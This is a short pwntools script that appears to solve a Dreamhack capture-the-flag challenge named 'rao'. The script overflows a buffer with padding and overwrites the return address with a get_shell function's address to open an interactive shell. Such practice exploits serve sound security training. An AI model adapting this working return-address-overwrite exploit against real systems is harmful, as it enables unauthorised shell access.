from pwn import *

p = process("./rao")
# p = remote("host1.dreamhack.games", 17920)

get_shell = 0x4006aa
# 0x4006aa
p.recvuntil("Input: ")

pay = b""
pay += b"A" * 0x28
pay += b"B" * 8
pay += p64(get_shell)

# input("stop")

p.sendline(pay)

p.interactive()